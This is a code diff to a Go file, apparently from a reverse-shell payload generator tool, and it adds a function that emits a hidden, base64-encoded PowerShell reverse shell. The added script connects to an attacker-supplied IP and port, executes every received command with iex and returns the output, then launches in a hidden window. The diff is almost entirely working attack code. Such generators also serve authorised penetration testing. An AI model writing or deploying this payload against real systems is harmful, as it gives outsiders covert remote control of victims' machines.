@@ -44,6 +44,14 @@ func (r *ReverseShellGenerator) GeneratePowerShell() string {
 	return fmt.Sprintf("cmd /c powershell -e %s", encoded)
 }
 
+// GeneratePowerShellDetached generates a PowerShell reverse shell payload launched in a detached process.
+func (r *ReverseShellGenerator) GeneratePowerShellDetached() string {
+	psScript := fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, r.IP, r.Port)
+	utf16 := encodeUTF16LE(psScript)
+	encoded := base64.StdEncoding.EncodeToString(utf16)
+	return fmt.Sprintf(`Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-EncodedCommand','%s') | Out-Null`, encoded)
+}
+
 // encodeUTF16LE encodes a string to UTF-16 Little Endian
 func encodeUTF16LE(s string) []byte {
 	runes := []rune(s)
